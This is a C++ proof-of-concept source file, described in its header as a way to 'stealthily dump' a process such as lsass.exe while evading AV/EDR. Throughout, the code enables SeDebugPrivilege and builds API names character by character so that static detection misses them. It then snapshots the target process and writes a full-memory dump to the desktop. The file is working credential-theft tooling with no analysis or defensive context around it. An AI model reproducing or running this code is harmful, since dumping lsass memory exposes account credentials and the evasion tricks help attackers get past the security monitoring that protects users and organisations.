/* **********************************************************************
 *	PoC: dumper.cpp	
 *	Author: lorenzoinvidia
 *
 *  Description:
 *	Stealthy dump a process (e.g. lsass.exe) and evade AV/EDR
 *
 *	Compile in release-mode
 *  Pre-compiled binary in bins/
 *
 * ********************************************************************** 
 * */

#include <Windows.h>
#include <stdio.h>
#include <processsnapshot.h>
#include <Shlobj.h>
#include <DbgHelp.h>
#pragma comment (lib, "Dbghelp.lib")
#pragma comment(lib, "Shell32.lib")
//#pragma comment(lib, "Advapi32.lib")

BOOL CALLBACK MyMiniDumpWriteDumpCallback(
    __in     PVOID CallbackParam,
    __in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
    __inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
)
{
    switch (CallbackInput->CallbackType)
    {
    case 16: // IsProcessSnapshotCallback
        CallbackOutput->Status = S_FALSE;
        break;
    }
    return TRUE;
}

typedef HANDLE (WINAPI * OpenProcess_t)(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);

typedef BOOL (WINAPI * AdjustTokenPrivileges_t)(
  HANDLE            TokenHandle,
  BOOL              DisableAllPrivileges,
  PTOKEN_PRIVILEGES NewState,
  DWORD             BufferLength,
  PTOKEN_PRIVILEGES PreviousState,
  PDWORD            ReturnLength
);

typedef BOOL (WINAPI * LookupPrivilegeValue_t)(
  LPCSTR lpSystemName,
  LPCSTR lpName,
  PLUID  lpLuid
);

typedef BOOL (WINAPI * OpenProcessToken_t)(
  HANDLE  ProcessHandle,
  DWORD   DesiredAccess,
  PHANDLE TokenHandle
);


BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
) {

    
    char __Advapi32[] = {'A','d','v','a','p','i','3','2','.','d','l','l',0};
    char __LookupPrivilegeValueA[] = {'L','o','o','k','u','p','P','r','i','v','i','l','e','g','e','V','a','l','u','e','A',0};
    char __AdjustTokenPrivileges[] = {'A','d','j','u','s','t','T','o','k','e','n','P','r','i','v','i','l','e','g','e','s',0};

    HMODULE hAdv32 = LoadLibraryA(__Advapi32);
    LookupPrivilegeValue_t pLookupPrivilegeValue = (LookupPrivilegeValue_t)GetProcAddress(hAdv32, __LookupPrivilegeValueA);
    AdjustTokenPrivileges_t pAdjustTokenPrivileges = (AdjustTokenPrivileges_t)GetProcAddress(hAdv32, __AdjustTokenPrivileges);

    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (
        !pLookupPrivilegeValue( 
            NULL,            // lookup privilege on local system
            lpszPrivilege,   // privilege to lookup 
            &luid            // receives LUID of privilege
        ) 
    ) {
        printf("LookupPV error: %u\n", GetLastError() ); 
        return FALSE; 
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    else
        tp.Privileges[0].Attributes = 0;

    // Enable the privilege or disable all privileges.

    if ( !pAdjustTokenPrivileges(
           hToken, 
           FALSE, 
           &tp, 
           sizeof(TOKEN_PRIVILEGES), 
           (PTOKEN_PRIVILEGES) NULL, 
           (PDWORD) NULL) ){ 
          printf("AdjustTP error: %u\n", GetLastError() ); 
          return FALSE; 
    } 

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED){
          printf("The token does not have the specified privilege. \n");
          return FALSE;
    } 

    printf("Got %s\n", lpszPrivilege);

    return TRUE;
}

int main (int argc, char * argv[]){

    if (argc != 2){
        printf("Miss pid\n");
        return 1;
    }
    DWORD pid = atoi(argv[1]);

    char k32[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
    char __Advapi32[] = {'A','d','v','a','p','i','3','2','.','d','l','l',0};
    char __OpenProcess[] = {'O','p','e','n','P','r','o','c','e','s','s',0};
    char __OpenProcessToken[] = {'O','p','e','n','P','r','o','c','e','s','s','T','o','k','e','n',0};
    char __SeDebugPrivilege[] = {'S','e','D','e','b','u','g','P','r','i','v','i','l','e','g','e',0};

    HMODULE hK32 = GetModuleHandleA(k32);
    HMODULE hAdv32 = LoadLibraryA(__Advapi32);
    OpenProcess_t pOpenProcess = (OpenProcess_t)GetProcAddress(hK32,__OpenProcess);
    OpenProcessToken_t pOpenProcessToken = (OpenProcessToken_t)GetProcAddress(hAdv32, __OpenProcessToken);

    // Get SeDebugPrivilege
    HANDLE hToken;
    pOpenProcessToken((HANDLE)-1, TOKEN_ADJUST_PRIVILEGES, &hToken);
    if (!SetPrivilege(hToken, __SeDebugPrivilege, TRUE)) return 1;
    

    HANDLE hProcess=pOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess){
        printf(" OpenP error: %d\n", GetLastError());
    }else{
        printf("Pid: %d - Handle = %#x\n",pid, (int)hProcess);
    }
    HANDLE snapshotHandle;
    DWORD flags = (DWORD)PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;
    
    if (PssCaptureSnapshot(hProcess, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, (HPSS*)&snapshotHandle) != ERROR_SUCCESS) {
        printf("Snap failed!\n");
        return 1;
    }

    MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
    ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
    CallbackInfo.CallbackRoutine = &MyMiniDumpWriteDumpCallback;
    CallbackInfo.CallbackParam = NULL;

    char path[MAX_PATH];

    SHGetFolderPathA(
        NULL,
        CSIDL_DESKTOPDIRECTORY | CSIDL_FLAG_CREATE,
        NULL,
        SHGFP_TYPE_CURRENT,
        path
    );
    strcat(path, "\\proc.dmp");
    HANDLE outFile = CreateFileA(path, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (MiniDumpWriteDump(snapshotHandle, pid, outFile, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo)) {
        printf("Dumped successfully: %s\n", path);
    } else {
        printf("Dump failed with error:%d\n", GetLastError());
    }

    PssFreeSnapshot(GetCurrentProcess(), (HPSS)snapshotHandle);

    return 0;
}